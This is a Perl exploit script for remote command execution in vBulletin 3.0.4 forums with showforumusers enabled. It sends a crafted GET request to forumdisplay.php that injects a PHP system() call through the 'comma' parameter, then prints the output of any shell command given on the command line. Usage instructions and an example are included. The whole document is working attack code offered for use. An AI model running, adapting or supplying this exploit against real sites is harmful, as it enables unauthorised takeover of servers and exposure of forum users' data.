#!/usr/bin/perl
# vbulletin 3.0.4 remote command execution by pokleyzz <pokleyzz_at_scan-associates.net>
#
# Requirement:
#       showforumusers ON
#
#
# bug found by AL3NDALEEB <al3ndaleeb_at_uk2.net>
#
# usage :
#               vbulletin30-xp.pl <forumdisplay.php url> <forum id> <command>
#
#       example :
#               vbulletin30-xp.pl http://192.168.1.78/forumdisplay.php 1 "ls -la"
#
# !! Happy Chinese new Year !!

use IO::Socket;

sub parse_url {
    local($url) = @_;

    if ($url =~ m#^(\w+):#) {
                        $protocol = $1;
                        $protocol =~ tr/A-Z/a-z/;
    } else {
                        return undef;
    }

    if ($protocol eq "http") {
                                if ($url =~ m#^\s*\w+://([\w-\.]+):?(\d*)([^ \t]*)$#) {
                    $server = $1;
                    $server =~ tr/A-Z/a-z/;
                    $port = ($2 ne "" ? $2 : $http_port);
                    $path = ( $3 ? $3 : '/');
                    return ($protocol, $server, $port, $path);
                        }
                return undef;
    }
}

sub urlencode{
    my($esc) = @_;
    $esc =~ s/^\s+|\s+$//gs;
    $esc =~ s/([^a-zA-Z0-9_\-.])/uc sprintf("%%%02x",ord($1))/eg;
    $esc =~ s/ /\+/g;
    $esc =~ s/%20/\+/g;
    return $esc;
}

$url = $ARGV[0];
$fid = $ARGV[1];
$cmd = urlencode($ARGV[2]);

$http_port = 80;

$shellcode ="GLOBALS[]=1&f=$fid&cmd=$cmd&comma={\${system(\$cmd)}}{\${exit()}}";

@target = parse_url($url);

$conn = IO::Socket::INET->new (
                                                                                Proto => "tcp",
                                                                                PeerAddr => $target[1],
                                                                                PeerPort => $target[2],
                                ) or die "\nUnable to connect\n";

$conn -> autoflush(1);
print $conn "GET $target[3]?$shellcode HTTP/1.1\r\nHost: $target[1]:$target[2]\r\nConnection: Clos
e\r\n\r\n";
while (<$conn>){
        print $_;
}
close $conn;

